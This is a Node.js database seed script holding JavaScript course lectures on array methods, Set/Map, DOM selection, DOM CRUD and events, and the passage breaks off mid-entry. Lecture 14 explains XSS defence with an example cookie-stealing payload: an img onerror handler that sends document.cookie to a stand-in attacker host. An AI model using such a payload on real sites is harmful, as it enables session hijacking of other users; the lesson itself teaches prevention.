const path = require('path');
require('dotenv').config({ path: path.resolve(__dirname, '../.env') });
const pool = require('../config/db');

const batch2Lectures = [
  {
    topic_order: 12,
    slug: 'js-lecture-12-map-filter-reduce-foreach-set-and-map-data-structures',
    title: 'Lecture 12: Array Higher-Order Methods (forEach, filter, map, reduce) & ES6 Set and Map Data Structures',
    duration_minutes: 50,
    video_url: 'http://www.youtube.com/watch?v=UByPRYaMEkI',
    video_title: 'Map, Filter, Reduce, Set & Map in Javascript | Javascript Full Course #12',
    doc_links: [
      {
        title: 'MDN Web Docs — Array.prototype.reduce, map & filter',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/reduce',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/reduce'
      },
      {
        title: 'MDN Web Docs — ES6 Map & Set Keyed Collections',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Keyed_collections',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Keyed_collections'
      }
    ],
    short_description: 'Master functional array iteration with forEach, filter, map, and reduce, write custom polyfills on Array.prototype, and leverage ES6 Set and Map collections for O(1) lookups.',
    summary_markdown: `### 📌 Topic Overview
Modern JavaScript applications (especially in **React** and **Node.js**) rely heavily on declarative **Higher-Order Array Methods** (\`forEach\`, \`filter\`, \`map\`, \`reduce\`) and specialized ES6 collections (**\`Set\`** and **\`Map\`**) instead of imperative \`for\` loops.

### 💡 Declarative Array Iteration: \`forEach\`, \`filter\`, \`map\` & \`reduce\`
Every callback passed to \`forEach\`, \`filter\`, and \`map\` receives up to 3 arguments: **\`(element, index, array)\`**.
* **\`arr.forEach((el, idx, arr) => { ... })\`:** Executes a side-effect callback for each element. **Always returns \`undefined\`** and cannot be chained or stopped early with \`break\`.
* **\`arr.filter((el, idx, arr) => boolean)\`:** Returns a **new array** containing only the elements for which the callback returns a truthy value. Does not mutate the original array.
* **\`arr.map((el, idx, arr) => newValue)\`:** Transforms every element 1-to-1 and returns a **new array** of the exact same length containing the transformed values.
* **\`arr.reduce((accumulator, currentValue, idx, arr) => nextAcc, initialValue)\`:** Reduces an entire array down to a single value (a sum, an object frequency map, or a grouped lookup table). Always pass \`initialValue\` explicitly!

### 💡 ES6 \`Set\` & \`Map\` Data Structures
* **\`Set\` (Collection of Unique Values):**
  * Automatically rejects duplicate values in O(1) average time.
  * Core API: \`new Set(iterable)\`, \`.add(val)\`, \`.delete(val)\`, \`.has(val)\`, \`.clear()\`, and \`.size\` (property, not .length).
  * **1-Line Array Deduplication:** \`const uniqueArr = [...new Set(arr)];\`.
* **\`Map\` (True Key-Value Hash Map):**
  * Unlike plain Objects \`{}\` (which coerce all keys to Strings or Symbols), a **\`Map\` allows keys of ANY data type**—including numbers, booleans, arrays, functions, and object references!
  * Preserves exact insertion order and provides O(1) lookups via \`.set(key, val)\`, \`.get(key)\`, \`.has(key)\`, \`.delete(key)\`, and \`.size\`.

### 🛠️ Code Examples: Chaining, Custom Polyfill, \`Set\` & \`Map\`
\`\`\`javascript
const products = [
  { id: 1, name: "Laptop", price: 60000, inStock: true },
  { id: 2, name: "Mouse", price: 800, inStock: false },
  { id: 3, name: "Keyboard", price: 2500, inStock: true }
];

// 1. Chaining filter -> map -> reduce
const totalInStockPrice = products
  .filter(p => p.inStock)
  .map(p => p.price)
  .reduce((acc, price) => acc + price, 0);
console.log(totalInStockPrice); // 62500

// 2. Writing a Custom Polyfill for filter on Array.prototype
Array.prototype.myFiltering = function(callback) {
  const ans = [];
  for (let i = 0; i < this.length; i++) {
    if (callback(this[i], i, this)) {
      ans.push(this[i]);
    }
  }
  return ans;
};

// 3. Deduplicating an Array with Set & Using Non-String Keys in Map
const rawIds = [10, 20, 10, 30, 20];
const uniqueIds = [...new Set(rawIds)]; // [10, 20, 30]

const userMap = new Map();
const objKey = { role: "admin" };
userMap.set(objKey, "Full Access");
userMap.set(101, "Rohit");
console.log(userMap.get(objKey), userMap.size); // "Full Access", 2
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-12-q1',
        title: 'Q1: What is the difference between Array.prototype.map() and Array.prototype.forEach()?',
        difficulty: 'Easy',
        answer: '1) Return Value: map() allocates and returns a brand-new array of the same length containing the return value of the callback for each element. forEach() always returns undefined and is used purely for side effects (like logging or mutating external state). 2) Chainability: Because map() returns an array, you can chain .filter(), .reduce(), or .sort() directly after it, whereas you cannot chain array methods after forEach().'
      },
      {
        id: 'js-lec-12-q2',
        title: 'Q2: How would you implement your own custom polyfill for Array.prototype.map() and Array.prototype.filter() in an interview?',
        difficulty: 'Medium',
        answer: 'Attach the method to Array.prototype using a regular function (never an arrow function, so this points to the calling array). Inside, create const result = [], loop from i = 0 to this.length - 1, invoke callback(this[i], i, this), and for map push the returned value into result (or for filter, push this[i] only if callback returns truthy), then return result.'
      },
      {
        id: 'js-lec-12-q3',
        title: 'Q3: What happens if you call arr.reduce((acc, curr) => acc + curr) WITHOUT passing an initialValue, especially on an empty array?',
        difficulty: 'Medium',
        answer: 'If initialValue is omitted on a non-empty array, reduce() uses arr[0] as the initial accumulator and starts iterating from index 1. However, if the array is empty [] and no initialValue is provided, calling [].reduce(...) immediately throws a TypeError: Reduce of empty array with no initial value! Always pass an explicit initialValue (like 0, [], or {}) in production code.'
      },
      {
        id: 'js-lec-12-q4',
        title: 'Q4: What are the key differences between a JavaScript Object {} and an ES6 Map?',
        difficulty: 'Medium',
        answer: '1) Key Types: Plain Object keys are strictly coerced to Strings (or Symbols)—using an object as a key in {} turns it into "[object Object]". An ES6 Map accepts ANY value as a key (objects, functions, numbers, booleans) without coercion. 2) Size & Iteration: Map tracks its size in O(1) via map.size and is directly iterable with for...of in exact insertion order; Objects require Object.keys(obj).length. 3) Prototype Pollution: A Map has no default prototype keys colliding with user keys like "toString" or "constructor".'
      },
      {
        id: 'js-lec-12-q5',
        title: 'Q5: If you add two identical-looking objects to a Set: const s = new Set(); s.add({ a: 1 }); s.add({ a: 1 }); what will s.size be?',
        difficulty: 'Medium',
        answer: 's.size will be 2! Set checks uniqueness using the SameValueZero algorithm (similar to ===, except NaN equals NaN). Because the two object literals { a: 1 } and { a: 1 } are two separate allocations on the Heap with different memory addresses, Set treats them as two distinct values. If you stored const obj = { a: 1 } and called s.add(obj) twice, s.size would be 1.'
      },
      {
        id: 'js-lec-12-q6',
        title: 'Q6: Why does [1, 2, 3].filter(x => x * 2) return [1, 2, 3] instead of [2, 4, 6]?',
        difficulty: 'Easy',
        answer: 'Because filter() does not transform elements—it only coerces the callback\'s return value to a boolean (Truthy vs. Falsy) to decide whether to keep the original element! Since 1*2 (2), 2*2 (4), and 3*2 (6) are all non-zero truthy numbers, filter() keeps all three original elements [1, 2, 3]. To transform them into [2, 4, 6], you must use .map().'
      }
    ]
  },
  {
    topic_order: 13,
    slug: 'js-lecture-13-dom-architecture-selectors-htmlcollection-vs-nodelist',
    title: 'Lecture 13: DOM Architecture & Selectors — How HTML Becomes a Tree of JS Objects, querySelector & HTMLCollection vs. NodeList',
    duration_minutes: 52,
    video_url: 'http://www.youtube.com/watch?v=wLp99HGG8GQ',
    video_title: 'JavaScript DOM Manipulation | The Document Object Model (DOM) Explained | Javascript Full Course #13',
    doc_links: [
      {
        title: 'MDN Web Docs — Introduction to the DOM (Document Object Model)',
        url: 'https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction',
        link: 'https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction'
      }
    ],
    short_description: 'Understand how the browser parses raw HTML text into the Document Object Model (DOM) tree, select elements with getElementById and querySelectorAll, and contrast live HTMLCollections with static NodeLists.',
    summary_markdown: `### 📌 Topic Overview
JavaScript cannot directly manipulate raw text inside an \`.html\` file. When a browser loads a webpage, its rendering engine parses the HTML document and converts every tag, attribute, and text node into a hierarchical tree of **JavaScript Objects** in memory called the **DOM (Document Object Model)**, exposed under \`window.document\`.

### 💡 Selecting DOM Elements
* **Single Element Selectors:**
  * **\`document.getElementById("first")\`:** Fastest lookup by unique \`id\` attribute.
  * **\`document.querySelector(".card > h2")\`:** Returns the **first** element matching any valid CSS selector (\`#id\`, \`.class\`, \`tag\`, attribute selectors).
* **Multiple Element Selectors:**
  * **\`document.getElementsByClassName("item")\` / \`getElementsByTagName("li")\`:** Returns a **Live \`HTMLCollection\`**.
  * **\`document.querySelectorAll(".item")\`:** Returns a **Static \`NodeList\`**.

### 💡 \`HTMLCollection\` vs. \`NodeList\` & Converting to Arrays
* **Live \`HTMLCollection\`:** Automatically updates itself if matching elements are later added to or removed from the DOM. Does **not** have \`.forEach()\` or \`.map()\`.
* **Static \`NodeList\` (from \`querySelectorAll\`):** A snapshot at the time of query. Supports \`.forEach()\`, but still lacks \`.map()\`, \`.filter()\`, or \`.reduce()\`.
* **Converting to a Real Array:** Use **\`Array.from(collection)\`** or the spread operator **\`[...collection]\`** to unlock all \`Array.prototype\` methods.

### 💡 \`textContent\` vs. \`innerText\` vs. \`innerHTML\`
* **\`el.textContent\`:** Returns or sets all raw text inside the element, **including hidden text** (e.g., \`display: none\`), without parsing HTML tags. Fast and safe.
* **\`el.innerText\`:** Layout-aware—returns only **visibly rendered text** (ignores \`display: none\` elements and triggers a CSS reflow calculation).
* **\`el.innerHTML\`:** Parses and renders raw HTML markup strings inside the element.

### 🛠️ Code Examples: DOM Selection, Traversal & Array Conversion
\`\`\`javascript
// 1. Selecting & Styling an Element (camelCase CSS properties)
const heading = document.getElementById("first");
heading.textContent = "Hello Coder Army!";
heading.style.backgroundColor = "orange";
heading.style.color = "brown";

// 2. Converting NodeList / HTMLCollection into a true JS Array
const items = document.querySelectorAll(".course-item");
const itemTexts = Array.from(items).map(el => el.textContent.trim());

// 3. DOM Tree Traversal (Element-only properties ignore whitespace text nodes)
const list = document.querySelector("#course-list");
console.log(list.parentElement);          // Parent element
console.log(list.children);               // HTMLCollection of child element nodes
console.log(list.firstElementChild);      // First child element
console.log(list.lastElementChild);       // Last child element
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-13-q1',
        title: 'Q1: What is the difference between an HTMLCollection and a NodeList in the DOM?',
        difficulty: 'Medium',
        answer: '1) Live vs. Static: getElementsByClassName() and getElementsByTagName() return a LIVE HTMLCollection—if a new matching element is appended to the DOM later, the collection length updates automatically. querySelectorAll() returns a STATIC NodeList snapshot that does not change if the DOM mutates later. 2) Node Types: HTMLCollection contains only Element nodes, whereas a NodeList can contain any node type (Element nodes, Text nodes, Comment nodes). 3) Iteration: NodeList has a built-in .forEach() method; HTMLCollection does not (both can be converted to real arrays via Array.from()).'
      },
      {
        id: 'js-lec-13-q2',
        title: 'Q2: What is the exact difference between innerHTML, innerText, and textContent?',
        difficulty: 'Easy',
        answer: '1) innerHTML parses string content as HTML tags (e.g., "<b>Hi</b>" creates a bold element), which is slower and vulnerable to XSS if used with untrusted user input. 2) textContent reads or writes raw text literally (treating "<b>Hi</b>" as plain characters) and includes text inside hidden (<span style="display:none">) elements without triggering a layout reflow. 3) innerText is CSS/layout-aware: it respects styling, ignores hidden elements, and triggers a browser reflow calculation.'
      },
      {
        id: 'js-lec-13-q3',
        title: 'Q3: Why is childNodes different from children when traversing the DOM tree?',
        difficulty: 'Easy',
        answer: 'el.childNodes returns a NodeList of ALL child nodes, which includes invisible whitespace/newline Text nodes (#text) and HTML comments (<!-- -->) between tags! el.children returns an HTMLCollection containing strictly HTML Element nodes, which is almost always what developers want when traversing UI elements.'
      },
      {
        id: 'js-lec-13-q4',
        title: 'Q4: Why can\'t you call .map() or .filter() directly on the result of document.querySelectorAll(), and how do you fix it?',
        difficulty: 'Easy',
        answer: 'document.querySelectorAll() returns a NodeList, not an Array. Its prototype is NodeList.prototype (which only implements forEach, entries, keys, values), not Array.prototype. To use .map() or .filter(), convert it into a real Array using Array.from(document.querySelectorAll("...")) or [...document.querySelectorAll("...")].'
      },
      {
        id: 'js-lec-13-q5',
        title: 'Q5: What is the difference between the window object and the document object in a browser?',
        difficulty: 'Easy',
        answer: 'window is the top-level global object representing the browser tab/window itself (providing BOM APIs like localStorage, location, history, setTimeout, fetch, and innerWidth). document (window.document) is a property of window that specifically represents the parsed HTML/DOM tree loaded inside that tab.'
      },
      {
        id: 'js-lec-13-q6',
        title: 'Q6: Why are CSS properties written in camelCase in JavaScript (e.g., el.style.backgroundColor) instead of kebab-case (background-color)?',
        difficulty: 'Easy',
        answer: 'In JavaScript syntax, a hyphen (-) is parsed as the subtraction operator! Writing el.style.background-color would attempt to subtract the variable color from el.style.background. Therefore, the CSSOM maps hyphenated CSS property names to camelCase identifiers (backgroundColor, fontSize, zIndex)—or you can use bracket notation el.style["background-color"].'
      }
    ]
  },
  {
    topic_order: 14,
    slug: 'js-lecture-14-dom-crud-operations-createelement-xss-security',
    title: 'Lecture 14: DOM CRUD Operations & XSS Security — createElement, append, classList & Preventing Cross-Site Scripting',
    duration_minutes: 54,
    video_url: 'http://www.youtube.com/watch?v=2jVOkYiAl2s',
    video_title: 'CRUD Operation in DOM | The Document Object Model (DOM) Explained | Javascript Full Course #14',
    doc_links: [
      {
        title: 'MDN Web Docs — Document.createElement() & DOM Manipulation',
        url: 'https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement',
        link: 'https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement'
      }
    ],
    short_description: 'Dynamically create, insert, update, and remove DOM elements, manage attributes and CSS classes with classList, and prevent Cross-Site Scripting (XSS) vulnerabilities caused by innerHTML.',
    summary_markdown: `### 📌 Topic Overview
Building dynamic web applications requires full **CRUD (Create, Read, Update, Delete)** control over DOM nodes at runtime—along with a deep understanding of **Cross-Site Scripting (XSS)** security so user-submitted data (like comments or profile names) cannot execute malicious JavaScript in other users' browsers.

### 💡 Creating & Inserting DOM Elements
* **\`document.createElement("tag")\`:** Allocates a new detached DOM element node in memory (e.g., \`const h2 = document.createElement("h2")\`).
* **Modern Insertion Methods:**
  * **\`parent.append(...nodesOrStrings)\`:** Appends one or more elements or text strings as the **last** children of \`parent\`.
  * **\`parent.prepend(...nodesOrStrings)\`:** Inserts as the **first** children of \`parent\`.
  * **\`element.before(...nodes)\` & \`element.after(...nodes)\`:** Inserts sibling elements immediately before or after \`element\`.
  * **Legacy \`parent.appendChild(node)\`:** Only accepts a single \`Node\` object (rejects plain strings) and returns the appended node.

### 💡 Managing Attributes, Classes & Deleting Elements
* **Attributes:** \`el.getAttribute("href")\`, \`el.setAttribute("data-id", "101")\`, \`el.removeAttribute("disabled")\`.
* **\`el.classList\` API:** Prefer \`el.classList.add("active")\`, \`.remove("active")\`, \`.toggle("dark-mode")\`, and \`.contains("active")\` over overwriting \`el.className\` directly.
* **Removing Elements:** Call **\`el.remove()\`** directly on the element (or legacy \`parent.removeChild(el)\`).

### 💡 Critical Security: Why \`innerHTML\` Causes XSS (Cross-Site Scripting)
* Suppose a user submits a comment on your app containing:
  \`<img src="invalid.jpg" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">\`
* If you render that comment into the DOM using **\`commentBox.innerHTML = userComment\`**, the browser parses the \`<img>\` tag, fails to load \`invalid.jpg\`, and **executes the attacker's JavaScript inside every viewer's browser**—stealing their session cookies or tokens!
* **Defense Rule:** **Always use \`el.textContent = userComment\`** for user-generated content so the browser renders it as inert literal text without ever executing embedded HTML/scripts.

### 🛠️ Code Examples: Safe DOM CRUD & Class Management
\`\`\`javascript
// 1. Create, Configure, and Insert a New Element Safely
const parentList = document.getElementById("course-list");
const newItem = document.createElement("li");

newItem.textContent = "MERN Stack & System Design"; // Safe against XSS!
newItem.classList.add("course-card", "highlighted");
newItem.setAttribute("data-course-id", "mern-101");

parentList.append(newItem); // Appends at the end of #course-list

// 2. Insert Before/After a Specific Sibling & Remove an Element
const firstItem = parentList.firstElementChild;
const banner = document.createElement("div");
banner.textContent = "New Batch Starting Soon!";
firstItem.before(banner);

// Delete an element from the DOM:
// banner.remove();
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-14-q1',
        title: 'Q1: How can using element.innerHTML with user-submitted input lead to an XSS (Cross-Site Scripting) attack, and how do you prevent it?',
        difficulty: 'Hard',
        answer: 'When you assign a string to innerHTML, the browser\'s HTML parser creates real DOM elements from any tags in the string. Even though HTML5 blocks plain <script> tags inserted via innerHTML from running, attackers bypass this using event handler attributes like <img src="x" onerror="maliciousCode()">. When the image fails to load, the onerror JS executes with full access to the victim\'s localStorage, session tokens, and DOM. To prevent XSS, always assign untrusted user strings using element.textContent (or document.createTextNode()), which escapes < and > as plain text.'
      },
      {
        id: 'js-lec-14-q2',
        title: 'Q2: What are the differences between parent.append() and parent.appendChild()?',
        difficulty: 'Easy',
        answer: '1) Arguments: append() can accept multiple Node objects AND plain DOMStrings at once (e.g., div.append(span1, "Hello", span2)), whereas appendChild() accepts only a single Node object (passing a string throws a TypeError). 2) Return value: append() returns undefined, while appendChild() returns the appended Node reference.'
      },
      {
        id: 'js-lec-14-q3',
        title: 'Q3: Why is el.classList.add("active") preferred over el.className = "active"?',
        difficulty: 'Easy',
        answer: 'Setting el.className = "active" completely overwrites and wipes out any existing CSS classes already attached to the element (such as "btn btn-primary"). Using el.classList.add("active"), .remove("active"), or .toggle("active") adds or removes individual classes cleanly without disturbing the element\'s other classes.'
      },
      {
        id: 'js-lec-14-q4',
        title: 'Q4: If you need to append 1,000 list items (<li>) to a <ul>, why is calling ul.append(li) 1,000 times inside a loop bad for performance, and how do you optimize it?',
        difficulty: 'Medium',
        answer: 'Touching the live DOM inside a 1,000-iteration loop can trigger repeated layout recalculations (Reflows) and Repaints. Instead, create an offscreen lightweight container using const fragment = document.createDocumentFragment() (or build the nodes in a detached container), append all 1,000 <li> elements to the fragment in memory, and then call ul.append(fragment) ONCE at the end—triggering only a single DOM reflow!'
      },
      {
        id: 'js-lec-14-q5',
        title: 'Q5: Why do <script> tags placed inside <head> without defer fail to select body elements (returning null), and what is the difference between async and defer?',
        difficulty: 'Medium',
        answer: 'When the browser encounters a regular <script> in <head>, it pauses HTML parsing and runs the script before the <body> tags even exist in the DOM—so document.getElementById() returns null. Adding defer downloads the script in parallel with HTML parsing and guarantees execution ONLY after the entire HTML document has been parsed into the DOM (and in exact script order). async also downloads in parallel but executes immediately as soon as the download finishes, potentially before the DOM is ready and out of order.'
      },
      {
        id: 'js-lec-14-q6',
        title: 'Q6: What happens if you call parent2.append(existingNode) when existingNode is already inside parent1 in the DOM?',
        difficulty: 'Medium',
        answer: 'A single DOM node reference can only exist in one place in the DOM tree at a time. Calling parent2.append(existingNode) automatically removes existingNode from parent1 and moves it into parent2—it does NOT clone the node! If you want a duplicate copy in both places, use existingNode.cloneNode(true).'
      }
    ]
  },
  {
    topic_order: 15,
    slug: 'js-lecture-15-dom-events-addeventlistener-bubbling-capturing-delegation',
    title: 'Lecture 15: DOM Events In-Depth — addEventListener, Event Object, Event Bubbling vs. Capturing & Event Delegation',
    duration_minutes: 65,
    video_url: 'http://www.youtube.com/watch?v=CGjHpnm8TeE',
    video_title: 'Events in Javascript | Even and Event handler in Javascript | Javascript Full Course #15',
    doc_links: [
      {
        title: 'MDN Web Docs — EventTarget.addEventListener() & Event Propagation',
        url: 'https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener',
        link: 'https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener'
      }
    ],
    short_description: 'Handle user interactions with addEventListener(), inspect the Event object, master the 3 phases of Event Propagation (Capturing, Target, Bubbling), and optimize memory with Event Delegation.',
    summary_markdown: `### 📌 Topic Overview
Browser **Events** (\`click\`, \`dblclick\`, \`input\`, \`keydown\`, \`submit\`) occur continuously whenever a user interacts with a webpage. **Event Listeners** allow JavaScript to subscribe to specific events and execute callback logic in response.

### 💡 3 Ways to Attach Event Handlers (And Why \`addEventListener\` Wins)
1. **Inline HTML (\`<h1 onclick="handleClick()">\` — Avoid):** Mixes HTML markup with JS logic and requires global functions.
2. **DOM Property (\`btn.onclick = fn\` — Avoid):** Can only hold **one** function at a time! Assigning a second \`btn.onclick = fn2\` overwrites and destroys the first listener.
3. **\`el.addEventListener(eventType, callback, useCapture)\` (Best Practice):**
   * Allows attaching **multiple independent listeners** to the same element and event.
   * Supports removing listeners via \`el.removeEventListener(eventType, namedCallback)\` (requires passing the exact same function reference).
   * Controls propagation phase via the 3rd boolean parameter (\`false\` = Bubbling by default, \`true\` = Capturing).

### 💡 Event Propagation: Capturing (Trickling) vs. Bubbling
Because a child element \`<button>\` physically sits inside its \`<div class="parent">\`, which sits inside \`<body>\` and \`window\`, clicking the child also clicks the parent! The W3C DOM Event model processes every event in **3 phases**:
1. **Capturing Phase (Trickling Down: \`window -> document -> body -> grandparent -> parent\`):** Travels from root down to the target. Triggered only when the 3rd argument of \`addEventListener\` is **true**.
2. **Target Phase:** Reaches the actual clicked element (\`event.target\`).
3. **Bubbling Phase (Bubbling Up: \`child -> parent -> grandparent -> body -> window\`):** Travels from the target back up to the root. **Default behavior (false)**.

### 💡 Event Delegation (High-Performance Pattern)
* Instead of attaching **100 separate \`addEventListener\` callbacks** to 100 child buttons (which wastes memory and fails for dynamically added children), attach **1 single listener to the parent container**!
* Because click events bubble up from the clicked child to the parent, the parent listener inspects **\`event.target\`** to identify which specific child was clicked.

### 🛠️ Code Examples: Event Bubbling, Capturing & Event Delegation
\`\`\`javascript
// 1. Event Bubbling (false - default) vs. Event Capturing (true)
grandParent.addEventListener("click", () => console.log("GrandParent"), false);
parent.addEventListener("click", () => console.log("Parent"), true); // Capturing!
child.addEventListener("click", (e) => {
  console.log("Child clicked!");
  // e.stopPropagation(); // Uncomment to stop event from bubbling up further
}, false);
// Clicking Child logs: "Parent" (captured on way down) -> "Child clicked!" -> "GrandParent" (bubbled up)

// 2. Event Delegation: 1 Listener on Parent handles all Child color buttons!
const container = document.getElementById("color-palette");
container.addEventListener("click", (event) => {
  // event.target = exact child button clicked; event.currentTarget = container
  if (event.target.tagName === "BUTTON") {
    document.body.style.backgroundColor = event.target.id;
  }
});
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-15-q1',
        title: 'Q1: Explain the 3 phases of DOM Event Propagation: Event Capturing vs. Target vs. Event Bubbling.',
        difficulty: 'Medium',
        answer: 'When an event occurs on a nested DOM element: 1) Capturing Phase (Trickling): The event travels from the top-level window/document down through ancestor elements to the target element (listeners registered with addEventListener(type, fn, true) fire here). 2) Target Phase: The event reaches the actual element that triggered it (event.target). 3) Bubbling Phase: The event bubbles back up from the target element through its parent, grandparent, body, and document to window (default listeners with useCapture = false fire here).'
      },
      {
        id: 'js-lec-15-q2',
        title: 'Q2: What is Event Delegation in JavaScript, and what are its two biggest advantages?',
        difficulty: 'Medium',
        answer: 'Event Delegation is the pattern of attaching a single event listener to a common parent container rather than attaching individual listeners to dozens or hundreds of child elements. Leveraging Event Bubbling, the parent listener checks event.target (or event.target.closest(selector)) to handle actions for the clicked child. Advantages: 1) Massive memory & performance savings (1 listener function in RAM instead of 1,000). 2) Dynamic elements added to the parent later automatically work without needing to attach new listeners!'
      },
      {
        id: 'js-lec-15-q3',
        title: 'Q3: What is the difference between event.target and event.currentTarget?',
        difficulty: 'Easy',
        answer: 'event.target refers to the exact deepest DOM element that originally triggered the event (e.g., the specific <button> the user clicked). event.currentTarget refers to the element to which the currently executing addEventListener handler is attached (e.g., the parent <div> in Event Delegation).'
      },
      {
        id: 'js-lec-15-q4',
        title: 'Q4: What is the difference between event.stopPropagation() and event.preventDefault()?',
        difficulty: 'Easy',
        answer: 'event.stopPropagation() stops the event from travelling further up (bubbling) or down (capturing) the DOM tree to other ancestor/child listeners, but does NOT cancel the browser\'s default action. event.preventDefault() cancels the browser\'s built-in default behavior for that element (such as preventing a <form> submit from reloading the page or preventing an <a href> link from navigating), without stopping propagation.'
      },
      {
        id: 'js-lec-15-q5',
        title: 'Q5: Why does el.removeEventListener("click", () => console.log("hi")) fail to remove a listener added with el.addEventListener("click", () => console.log("hi"))?',
        difficulty: 'Medium',
        answer: 'Because two inline anonymous arrow functions () => console.log("hi") create two completely separate function objects in the Heap with different memory addresses! For removeEventListener to work, you must store the handler in a named variable (const handleClick = () => ...) and pass that exact same function reference to both addEventListener and removeEventListener.'
      },
      {
        id: 'js-lec-15-q6',
        title: 'Q6: What is the difference between event.stopPropagation() and event.stopImmediatePropagation()?',
        difficulty: 'Hard',
        answer: 'If an element has three separate click listeners attached to it, calling event.stopPropagation() inside the first listener stops the event from bubbling up to parent elements, but the 2nd and 3rd click listeners on that SAME element will still execute! Calling event.stopImmediatePropagation() stops both parent bubbling AND prevents any remaining sibling listeners on that same element from running.'
      }
    ]
  },
  {
    topic_order: 16,
    slug: 'js-lecture-16-10-dom-projects-forms-timers-todo-crud-quiz-engine',
    title: 'Lecture 16: Building 10 Interactive DOM & State Projects — Quotes, Timers, Calculators, To-Do CRUD & Dynamic Quiz Engine',
    duration_minutes: 113,
    video_url: 'http://www.youtube.com/watch?v=dQDteO0RXrc',
    video_title: '10 JavaScript Projects for Beginners | Learn JS by Building Real Apps | Javascript Full Course #16',
    doc_links: [
      {
        title: 'MDN Web Docs — FormData API Reference',
        url: 'https://developer.mozilla.org/en-US/docs/Web/API/FormData',
        link: 'https://developer.mozilla.org/en-US/docs/Web/API/FormData'
      }
    ],
    short_description: 'Synthesize DOM manipulation, Event Delegation, FormData extraction, setInterval/setTimeout timers, and dynamic state rendering across 10 real-world interactive frontend applications.',
    summary_markdown: `### 📌 Topic Overview
This hands-on engineering session combines **DOM Selection**, **Event Listeners**, **Form Handling (\`FormData\`)**, **Timers (\`setInterval\` / \`setTimeout\`)**, and **Data Structures** to build 10 complete interactive mini-applications from scratch.

### 💡 Core Architectural Patterns Across the 10 Projects
1. **Random Quote Generator & Color Switcher:** Uses bounded random index generation (\`Math.floor(Math.random() * quotes.length)\`) and **Event Delegation** on a parent button container.
2. **Love Calculator & Income Tax Calculator:** Uses \`form.addEventListener("submit", (e) => { e.preventDefault(); ... })\` to prevent page reloads, extracts numeric inputs with \`Number(input.value)\`, and applies multi-slab tax bracket logic.
3. **Digital Clock & Olympic Countdown Timer:** Uses **\`setInterval(callback, 1000)\`** with \`new Date().toLocaleTimeString()\` and epoch millisecond math (\`targetMs - Date.now()\`) to update live UI counters every second.
4. **Clicker Particle Animation:** Reads click coordinates via **\`event.clientX\`** and **\`event.clientY\`**, dynamically creates a positioned particle \`<div>\`, and cleans it up from the DOM after animation using \`setTimeout(() => el.remove(), 5000)\` to prevent memory leaks.
5. **To-Do List CRUD App:** Dynamically creates task rows with Delete and Complete actions.
6. **Dynamic Quiz Engine with \`FormData\`:** Randomly samples K questions out of a 100-question pool without duplicates, renders radio inputs dynamically, and grades all answers in one shot using **\`new FormData(quizForm)\`**.

### 🛠️ Code Examples: \`FormData\` Quiz Grading & Particle Cleanup
\`\`\`javascript
// 1. Grading a Multi-Question Quiz Form Cleanly Using the FormData API
const quizForm = document.getElementById("quiz-form");
const answerKey = { q1: "B", q2: "A", q3: "D", q4: "C", q5: "A" };

quizForm.addEventListener("submit", (e) => {
  e.preventDefault(); // Prevent browser form reload!
  const formData = new FormData(quizForm);
  let score = 0;

  for (let [questionName, userAnswer] of formData.entries()) {
    if (answerKey[questionName] === userAnswer) {
      score++;
    }
  }
  document.getElementById("result").textContent = \`Score: \${score} / 5\`;
});

// 2. Sampling N Unique Random Questions from a Question Bank
function pickRandomQuestions(pool, count) {
  const copy = [...pool];
  const selected = [];
  for (let i = 0; i < count && copy.length > 0; i++) {
    const randIdx = Math.floor(Math.random() * copy.length);
    selected.push(copy[randIdx]);
    // Swap-and-pop in O(1) to avoid duplicate selection:
    copy[randIdx] = copy[copy.length - 1];
    copy.pop();
  }
  return selected;
}
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-16-q1',
        title: 'Q1: Why must you call event.preventDefault() inside a <form> submit event listener in Single-Page Applications?',
        difficulty: 'Easy',
        answer: 'By default, submitting an HTML <form> causes the browser to serialize the inputs and perform a full-page HTTP navigation/reload, which wipes out all in-memory JavaScript state! Calling event.preventDefault() suppresses the native page reload so JavaScript can validate inputs, compute results, or send an asynchronous fetch() request.'
      },
      {
        id: 'js-lec-16-q2',
        title: 'Q2: How does the FormData API simplify reading forms with 20+ inputs compared to selecting every input with getElementById()?',
        difficulty: 'Medium',
        answer: 'Instead of writing 20 separate document.getElementById() queries, passing the <form> element into new FormData(formElement) automatically collects the name and current value of every enabled input, select, textarea, and checked radio/checkbox inside the form. You can then iterate over formData.entries() or convert it into a plain object in one line via Object.fromEntries(new FormData(formElement)).'
      },
      {
        id: 'js-lec-16-q3',
        title: 'Q3: How do you randomly select 10 unique questions from an array of 100 questions in O(K) time without picking duplicates?',
        difficulty: 'Medium',
        answer: 'Using a partial Fisher-Yates shuffle (or Swap-and-Pop): pick a random index randIdx between 0 and currentLength - 1, push arr[randIdx] to your result, overwrite arr[randIdx] with the last element arr[currentLength - 1], and decrement currentLength (or pop()). This guarantees zero duplicates in O(K) time without O(N) array splicing.'
      },
      {
        id: 'js-lec-16-q4',
        title: 'Q4: In the Clicker Particle project, why is it critical to call circleElement.remove() inside setTimeout after the CSS animation ends?',
        difficulty: 'Easy',
        answer: 'Even if a CSS keyframe animation fades an element\'s opacity to 0, the DOM node itself remains mounted in the document tree consuming RAM and layout calculation overhead. If a user clicks 1,000 times without removing finished nodes, 1,000 invisible <div> elements accumulate in the DOM (a classic DOM memory leak). Removing the node via setTimeout(() => el.remove(), duration) frees the memory.'
      },
      {
        id: 'js-lec-16-q5',
        title: 'Q5: Why should a Countdown Timer recalculate targetTime - Date.now() on every tick instead of simply decrementing secondsLeft-- inside setInterval(fn, 1000)?',
        difficulty: 'Medium',
